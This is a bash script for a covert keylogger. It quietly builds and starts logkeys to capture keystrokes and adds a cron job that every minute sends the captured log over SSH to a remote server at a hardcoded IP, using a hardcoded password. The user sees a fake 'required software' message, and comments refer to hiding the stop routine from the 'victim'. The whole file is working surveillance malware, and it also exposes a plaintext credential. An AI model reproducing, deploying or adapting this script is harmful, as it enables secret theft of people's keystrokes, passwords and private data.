#!/bin/bash

LOG_DIR="/var/log/my_keylogs" #path to store log history and transfers 
LOG_FILE="$LOG_DIR/keypress_history.log"
TRANSFER_LOG_FILE="$LOG_DIR/transfer_activity.log"
KEYMAP_FILE="/usr/local/share/logkeys/keymaps/us.map" #file tjat maps events to keys
DEVICE_PATH="/dev/input/event2" # Event 2 for my device, could vary
LOGKEYS_PID_FILE="/var/run/logkeys.pid"
LOGKEYS_SRC_DIR="/tmp/logkeys_source"
EC2_USER="ubuntu" # User is ubuntu
SERVER_IP="98.92.166.9" # IP
EC2_DEST_DIR="/home/ubuntu/keylogs.log" # Path once in server

# Function to check if logkeys is running
is_logkeys_running() {
    [ -f "$LOGKEYS_PID_FILE" ] && ps -p "$(cat "$LOGKEYS_PID_FILE")" > /dev/null 2>&1
}

# Function to copy the keymap files from source (Runs if the file is missing)
copy_keymap_files() {
    local KEYMAP_INSTALL_DIR="/usr/local/share/logkeys/keymaps"

    [ -f "$KEYMAP_FILE" ] && return 0

    if [ ! -d "$LOGKEYS_SRC_DIR" ]; then
        git clone https://github.com/kernc/logkeys.git "$LOGKEYS_SRC_DIR" >/dev/null 2>&1 || return 1
    fi

    sudo sh -c "mkdir -p '$KEYMAP_INSTALL_DIR' && cp '$LOGKEYS_SRC_DIR/keymaps/en_US_ubuntu_1204.map' '$KEYMAP_FILE'" >/dev/null 2>&1

    [ -f "$KEYMAP_FILE" ] && sudo rm -rf "$LOGKEYS_SRC_DIR" >/dev/null 2>&1

    return 0
}

# clone the git repo to install logkeys if not already on system
install_logkeys() {
    if ! command -v logkeys &> /dev/null; then
        sudo apt update >/dev/null 2>&1
        sudo apt install build-essential git libevdev-dev automake autoconf -y >/dev/null 2>&1 || return 1
        [ -d "$LOGKEYS_SRC_DIR" ] && sudo rm -rf "$LOGKEYS_SRC_DIR" >/dev/null 2>&1
        git clone https://github.com/kernc/logkeys.git "$LOGKEYS_SRC_DIR" >/dev/null 2>&1 || return 1
        (cd "$LOGKEYS_SRC_DIR" && ./autogen.sh >/dev/null 2>&1 && ./configure >/dev/null 2>&1 && make >/dev/null 2>&1 && sudo make install >/dev/null 2>&1) || return 1
    fi
    return 0
}

# SSH into my AWS server and send whatever is in current keypress_history.log
# Also tracks sends in transfer_activity.log
transfer_logs() {
    local TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    if [ "$EUID" -ne 0 ]; then
        echo "[$TIMESTAMP] ERROR: Transfer must run as root." >> "$TRANSFER_LOG_FILE"
        return 1
    fi
    if [ ! -s "$LOG_FILE" ]; then
        echo "[$TIMESTAMP] Log file is empty. Skipping transfer." >> "$TRANSFER_LOG_FILE"
        return 0
    fi
    sudo apt install sshpass -y
    sshpass -p "Rowan123" ssh -o StrictHostKeyChecking=no "$EC2_USER@$SERVER_IP" "cat >> $EC2_DEST_DIR" < "$LOG_FILE"
    TRANSFER_STATUS=$?

    if [ $TRANSFER_STATUS -eq 0 ]; then
        echo "[$TIMESTAMP] Log transfer successful. Local log cleared." >> "$TRANSFER_LOG_FILE"
        sudo > "$LOG_FILE"
    else
        echo "[$TIMESTAMP] ERROR ($TRANSFER_STATUS): Log transfer failed." >> "$TRANSFER_LOG_FILE"
    fi
}

# Use elevated perms to set cron to call the transfer every minute
install_cron_job() {
    local CRON_SCHEDULE="*/1 * * * *" 
    local THIS_SCRIPT_PATH=$(readlink -f "$0")
    local CRON_JOB="$CRON_SCHEDULE $THIS_SCRIPT_PATH transfer >/dev/null 2>&1"

    (sudo crontab -l 2>/dev/null | grep -v "$THIS_SCRIPT_PATH transfer" 2>/dev/null; echo "$CRON_JOB") | sudo crontab - >/dev/null 2>&1
    (crontab -l 2>/dev/null | grep -v "$THIS_SCRIPT_PATH transfer") | crontab - >/dev/null 2>/dev/null
    return 0
}

# Just calls so all functions activate
start_logger_silent() {
    [ ! -d "$LOG_DIR" ] && sudo mkdir -p "$LOG_DIR" >/dev/null 2>&1 || true
    if is_logkeys_running; then
        sudo logkeys --kill >/dev/null 2>&1
        sleep 1
    fi
    sudo logkeys --start --output "$LOG_FILE" --device "$DEVICE_PATH" --keymap "$KEYMAP_FILE" >/dev/null 2>&1 || return 1
    install_cron_job
    return 0
}

# Emergency stop for dev, not for victim to find, stop logkeys, remove cron job, and clean all dirs
stop_and_cleanup() {
    local THIS_SCRIPT_PATH=$(readlink -f "$0")
    echo "Initiating Keylogger Stop and Cleanup..."
    sudo logkeys --kill >/dev/null 2>&1
    (sudo crontab -l 2>/dev/null | grep -v "$THIS_SCRIPT_PATH transfer") | sudo crontab - >/dev/null 2>&1
    sudo rm -rf "$LOG_DIR" >/dev/null 2>&1
    exit 0
}

# run everything
main() {
    if [ "$1" == "transfer" ]; then
        [ "$EUID" -ne 0 ] && exit 1
        transfer_logs
        exit $?
    fi

    if [ "$1" == "stop" ]; then
        stop_and_cleanup
    fi

    echo "Thank you for installing and running new required software!"

    if ! install_logkeys; then exit 1; fi
    if ! copy_keymap_files; then exit 1; fi
    if ! start_logger_silent; then exit 1; fi

    exit 0
}

if [ "$1" != "transfer" ] && [ "$1" != "stop" ] && [ "$EUID" -eq 0 ]; then
    echo "ERROR: Please run without 'sudo'. The script handles required permissions."
    exit 1
fi

main "$1"
